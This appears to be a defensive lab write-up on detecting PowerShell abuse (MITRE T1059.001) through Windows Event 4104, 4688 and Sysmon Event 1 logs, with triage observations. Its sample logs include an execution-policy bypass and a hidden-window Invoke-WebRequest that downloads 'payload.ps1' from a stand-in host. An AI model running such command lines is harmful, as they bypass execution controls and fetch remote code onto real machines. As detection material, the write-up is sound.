# Logs Observed — T1059.001 PowerShell Abuse

> Lab environment: Isolated Windows Server 2019 with PowerShell Script Block Logging enabled and Sysmon deployed.

---

## Event ID 4104 — Script Block Logging (PowerShell Operational)

**Log Path:** `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`

This event captures the full content of every PowerShell script block executed, including decoded versions of Base64-encoded commands.

**Example — Encoded command decoded by PowerShell before execution:**

```
Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Event ID:      4104
Task Category: Execute a Remote Command
Level:         Warning
Keywords:      (2)

ScriptBlockText: $c = 'Hello'
Path:
MessageNumber: 1
MessageTotal:  1
```

> Note: Even though `-EncodedCommand` was used, Event ID 4104 captures the **decoded** script block — making obfuscation transparent to the defender.

**Screenshot:** [screenshots/4104-scriptblock.png](./screenshots/4104-scriptblock.png)

---

## Event ID 4688 — Process Creation (Windows Security Log)

**Log Path:** `Windows Logs > Security`

Requires "Audit Process Creation" policy enabled with command line logging.

**Example — Execution policy bypass captured:**

```
Event ID:     4688
Subject:
  Account Name:   WORKSTATION\User
  Account Domain: WORKSTATION

Process Information:
  New Process Name:   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Token Elevation:    TokenElevationTypeLimited
  Creator Process:    C:\Windows\System32\cmd.exe

Process Command Line:
  powershell  -ExecutionPolicy Bypass -Command "whoami"
```

**Screenshot:** [screenshots/4688-processcreate.png](./screenshots/4688-processcreate.png)

---

## Sysmon Event ID 1 — Process Create

**Log Path:** `Applications and Services Logs > Microsoft > Windows > Sysmon > Operational`

Sysmon Event ID 1 provides richer context than 4688 — includes hash, parent process command line, and integrity level.

**Example — Hidden window PowerShell captured:**

```
EventID: 1
UtcTime: 2026-06-24 ...
ProcessGuid: {abc...}
ProcessId: 4812
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell  -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://example.com/payload.ps1"
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe
User: WORKSTATION\User
IntegrityLevel: Medium
Hashes: SHA256=...
```

**Screenshot:** [screenshots/sysmon-event1.png](./screenshots/sysmon-event1.png)

---

## Key Observations

- `-EncodedCommand` is **not** an evasion against 4104 — PowerShell decodes before logging the script block
- `-WindowStyle Hidden` does **not** prevent process creation logs
- `-NoProfile -NonInteractive` flags in the command line are strong indicators of non-human/automated execution
- Parent process (`cmd.exe` or `explorer.exe`) context matters for triage — a PowerShell child of `winword.exe` is far more suspicious
